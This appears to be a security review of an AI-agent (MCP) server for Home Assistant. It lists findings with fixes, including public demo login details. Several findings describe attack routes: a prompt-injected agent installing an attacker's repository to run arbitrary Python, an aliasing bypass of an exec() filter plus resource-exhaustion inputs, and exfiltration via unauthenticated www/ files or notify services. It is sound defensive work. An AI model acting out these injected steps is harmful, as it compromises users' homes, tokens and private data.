evidence.quote: # Demo environment token - use HOMEASSISTANT_TOKEN="demo" to connect to the public demo
# Demo server: https://ha-mcp-demo-server.qc-h.net (login: mcp/mcp, resets weekly)

reason: Deliberately published token for the project's public demo instance (whose login is also public and which resets weekly); it grants nothing private. Still make sure it is never the fallback for a real deployment.
fix: Optional: load the demo token from a docs-only constant or fetch it on demand; keep it scoped to the demo server.

reason: Token for the throw-away Home Assistant test container built from tests/initial_test_state; it is not valid for any real instance.
fix: None needed; keep it out of release artifacts.

reason: The add-on serves the full admin toolset (Supervisor token) over plain HTTP on every host interface; the only protection is a secret URL path, which is sent in clear text on the LAN, is printed to the add-on log, and can be replaced by a weak user-chosen secret_path.
fix: Bind to the internal add-on network or 127.0.0.1 unless remote access is enabled, require a bearer token header (not a URL path) and enforce a minimum entropy for custom secret_path; use HTTPS/ingress for remote access.

title: Agent can add any GitHub repo to HACS and install it - arbitrary Python runs inside Home Assistant
reason: A prompt-injected agent can call ha_hacs_add_repository('attacker/repo', category='integration'), then ha_hacs_download and ha_restart; the attacker's custom integration is Python that Home Assistant imports with full access to the host, all tokens and devices. The only check is that repository contains '/', and there is no human approval in the server.
fix: Disable custom-repository add/download by default behind an explicit feature flag, restrict to HACS default-store repositories or an operator allowlist, and require out-of-band human confirmation before installing integrations/python_scripts.

title: python_transform runs model-written Python with exec() behind an AST filter and no time limit
reason: The tool argument is executed in-process; the only protection is an AST allowlist plus empty __builtins__, which the review guide treats as insufficient. The method allowlist is already bypassable by aliasing (`f = config.copy; f()` is a Name call, not an attribute call), and `while True: pass` or `'a' * 10**10`-style input blocks the event loop or exhausts memory, taking the whole MCP server down. No escape to code execution was demonstrated in this review.
fix: Replace exec with a declarative patch format (JSON Patch / jq already offered), or run the transform in a separate process with a CPU/memory/time limit; at minimum add a timeout and forbid While.

title: ha_write_file writes model-chosen content into www/, which Home Assistant serves unauthenticated on its own origin
reason: Files in www/ are served at /local/ without authentication from the same origin as the HA frontend, so an injected call can drop an HTML/JS page that steals the admin's stored HA tokens when opened, or copy private data into a publicly readable URL as an exfiltration channel. Gated by HAMCP_ENABLE_FILESYSTEM_TOOLS (off by default).
fix: Disallow writing .html/.js/.svg (or any executable content type) to www/, or write to a non-served directory; require human confirmation for writes.

title: OAuth access tokens are unsigned base64 JSON containing the user's HA long-lived token, with no expiry

evidence.quote: No encryption or signing - credentials are readable but transmitted over HTTPS.

reason: verify_token accepts any bearer that base64-decodes to {"ha_token": ...} and forwards that value to Home Assistant, so the MCP-layer OAuth adds no authentication of its own (HA is the only check), and every MCP client/log that holds the access token holds the raw HA admin token forever; revoking the OAuth grant does nothing.
fix: Issue opaque random access tokens (or signed+encrypted JWTs with exp and audience) and keep the HA token server-side, encrypted at rest; enforce expiry and revocation.

title: Untrusted external text, private home data and outbound actions in one agent with no approval step
reason: Tools return third-party text (GitHub/blog release notes, HACS repo info, calendar and to-do items from external accounts) unmarked to the model, the same server exposes cameras, history and config, and ha_call_service can invoke any HA service including notify/rest_command, so injected text can make the agent send private data out. Whether that is reachable depends on which integrations the user has; the server itself has no approval gate.
fix: Mark external content as untrusted data in results, let operators restrict ha_call_service to an allowlist of domains (exclude notify/rest_command/shell_command/hassio by default), and document that clients must not auto-approve write tools.

title: Secret URL path (the only auth for the add-ons) is written to the add-on logs
reason: Anyone who can read add-on logs (other HA admins, diagnostics/bug-report dumps, support pastes) gets the credential that unlocks the full admin MCP server; the proxy even discovers the secret by scraping these logs.
fix: Show the URL once in the add-on UI/ingress page instead of logs, mask it in log output, and use a header token rather than a path secret.

title: Containment check uses string startswith without a separator
reason: A symlink inside www/, themes/ or custom_templates/ that resolves to a sibling such as /config-backup still passes the check, and writes use the unresolved path afterwards (TOCTOU). Exploitation needs an existing symlink, so this is hardening.
fix: Use resolved.is_relative_to(config_resolved / allowed_dir) and open with O_NOFOLLOW (or re-resolve immediately before the write).
